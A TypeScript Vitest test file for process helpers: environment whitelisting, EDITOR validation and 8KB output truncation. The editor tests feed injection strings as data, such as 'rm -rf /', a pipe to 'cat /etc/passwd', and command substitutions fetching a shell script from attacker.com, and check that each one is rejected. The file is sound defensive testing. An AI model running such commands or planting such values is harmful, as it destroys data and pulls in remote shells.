import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { buildSafeEnv, resolveEditor, spawnAsync } from "./process";

describe("buildSafeEnv", () => {
	it("includes whitelisted env vars", () => {
		const env = buildSafeEnv();
		// PATH should always be present in the environment
		expect(env.PATH).toBeDefined();
	});

	it("excludes non-whitelisted env vars", () => {
		// Set a non-whitelisted var
		process.env.SUPER_SECRET_KEY = "secret";
		const env = buildSafeEnv();
		expect(env.SUPER_SECRET_KEY).toBeUndefined();
		delete process.env.SUPER_SECRET_KEY;
	});

	it("applies overrides on top", () => {
		const env = buildSafeEnv({ ANTHROPIC_API_KEY: "test-key" });
		expect(env.ANTHROPIC_API_KEY).toBe("test-key");
	});

	it("overrides can override whitelisted keys", () => {
		const env = buildSafeEnv({ PATH: "/custom/path" });
		expect(env.PATH).toBe("/custom/path");
	});
});

describe("resolveEditor", () => {
	let savedEditor: string | undefined;
	let warnSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		savedEditor = process.env.EDITOR;
		warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
	});

	afterEach(() => {
		if (savedEditor === undefined) {
			delete process.env.EDITOR;
		} else {
			process.env.EDITOR = savedEditor;
		}
		warnSpy.mockRestore();
	});

	it("returns 'vi' when EDITOR is unset", () => {
		delete process.env.EDITOR;
		expect(resolveEditor()).toBe("vi");
	});

	it("returns valid editor name", () => {
		process.env.EDITOR = "vim";
		expect(resolveEditor()).toBe("vim");
		expect(warnSpy).not.toHaveBeenCalled();
	});

	it("extracts basename from absolute path", () => {
		process.env.EDITOR = "/usr/bin/vim";
		expect(resolveEditor()).toBe("vim");
		expect(warnSpy).not.toHaveBeenCalled();
	});

	it("falls back to vi for unknown editor", () => {
		process.env.EDITOR = "rm -rf /";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("rejects shell metacharacters", () => {
		process.env.EDITOR = "vim; malicious";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalledWith(
			expect.stringContaining("shell metacharacters"),
		);
	});

	it("rejects pipe injection", () => {
		process.env.EDITOR = "vim | cat /etc/passwd";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("rejects backtick injection", () => {
		process.env.EDITOR = "`curl attacker.com/shell.sh`";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("rejects command substitution", () => {
		process.env.EDITOR = "$(curl attacker.com/shell.sh)";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("accepts all allowed editors", () => {
		const allowed = ["vi", "vim", "nvim", "nano", "emacs", "code", "subl", "mate", "micro", "hx", "helix", "kate", "gedit"];
		for (const editor of allowed) {
			process.env.EDITOR = editor;
			expect(resolveEditor()).toBe(editor);
		}
	});
});

describe("spawnAsync output capping", () => {
	const TRUNCATION_PREFIX = "[Output truncated to last 8KB]\n";

	it("does not truncate output under 8KB", async () => {
		const result = await spawnAsync("node", ["-e", "process.stdout.write('A'.repeat(100))"]);
		expect(result.stdout).toBe("A".repeat(100));
		expect(result.stdout).not.toContain("[Output truncated");
	});

	it("truncates stdout exceeding 8KB with prefix", async () => {
		const result = await spawnAsync("node", ["-e", "process.stdout.write('A'.repeat(16384))"]);
		expect(result.stdout).toContain(TRUNCATION_PREFIX);
		expect(result.stdout.length).toBeLessThanOrEqual(8192 + TRUNCATION_PREFIX.length);
	});

	it("truncates stderr exceeding 8KB with prefix", async () => {
		const result = await spawnAsync("node", ["-e", "process.stderr.write('B'.repeat(16384))"]);
		expect(result.stderr).toContain(TRUNCATION_PREFIX);
		expect(result.stderr.length).toBeLessThanOrEqual(8192 + TRUNCATION_PREFIX.length);
	});

	it("keeps trailing bytes when truncating", async () => {
		const result = await spawnAsync("node", [
			"-e",
			"process.stdout.write('A'.repeat(8000) + 'Z'.repeat(1000))",
		]);
		expect(result.stdout).toContain(TRUNCATION_PREFIX);
		expect(result.stdout).toContain("Z".repeat(1000));
	});
});
